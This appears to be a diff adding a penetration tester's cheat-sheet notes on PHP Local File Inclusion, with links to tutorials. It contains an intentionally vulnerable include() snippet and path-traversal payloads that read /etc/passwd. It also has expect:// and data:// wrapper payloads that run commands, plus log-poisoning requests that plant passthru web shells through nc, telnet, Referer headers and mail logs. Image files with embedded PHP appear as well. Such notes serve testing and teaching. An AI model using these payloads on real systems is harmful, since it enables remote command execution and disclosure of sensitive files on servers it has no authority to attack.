@@ -1,0 +1,107 @@
+=Local File Inclusion
+
+https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
+https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
+
+https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
+
+
+    <?php
+
+    $file = $_GET[‘file’];
+
+    if(isset($file))
+
+    {
+
+    include(“pages/$file”);
+
+    }
+
+    else
+
+    {
+
+    include(“index.php”);
+
+    }
+
+    ?>
+
+==Identifying
+
+/script.php?page=index.html 
+/script.php?page=../../../../../../../../etc/passwd
+
+
+==PHP Wrappers
+php?page=expect://ls
+php?page=expect://ls
+
+
+
+
+local-file-inclusion
+1: apache error_log injection
+$ telnet xxx.xxx.xxx.xxx 80
+Trying xxx.xxx.xxx.xxx...
+Connected to xxx.xxx.xxx.xxx. Escape character is '^]'.
+GET /< ?php phpinfo(); ? > HTTP/1.0
+
+nc 192.168.1.102 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+
+nc 192.168.1.102 80
+GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+
+
+GET / HTTP/1.1
+Referer: <? passthru($_GET[cmd]) ?>
+Host: 192.168.1.159
+Connection: close
+
+
+http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
+
+2: Malicious image upload 
+$ echo "< ?php phpinfo(); ? >" >> image.jpg
+$ echo "< ?php include('image.jpg') ? >" > test.php
+echo "GIF89a< ?php phpinfo(); ? >" >file.gif
+
+ 3: Send e-mail
+ root@test:/# telnet localhost 25
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+220 hidden.domain.com ESMTP
+HELO
+250 hidden.domain.com
+MAIL FROM: anything < ?phpinfo();? >
+250 ok
+RCPT TO: non-existing@user.com
+250 ok
+DATA
+354 go ahead
+Subject: phpInjectionTest
+.
+250 ok 1186501618 qp 7063
+quit
+221 hidden.domain.com
+Connection closed by foreign host.
+root@test:/# grep phpinfo /var/log/maillog
+Aug 7 17:46:59 test qmail: 1186501618.685225 info msg 3903353: bytes 198 from < ?phpinfo();? > qp 7086 uid 2020
+Aug 7 17:46:59 test qmail-remote-handlers[7090]: from=?php-phpinfo();?
+
+
+
+data://text/plain, <?php system("whoami");?>
+
+
+https://book.hacktricks.xyz/pentesting-web/file-inclusion
+
+
+=fuzz
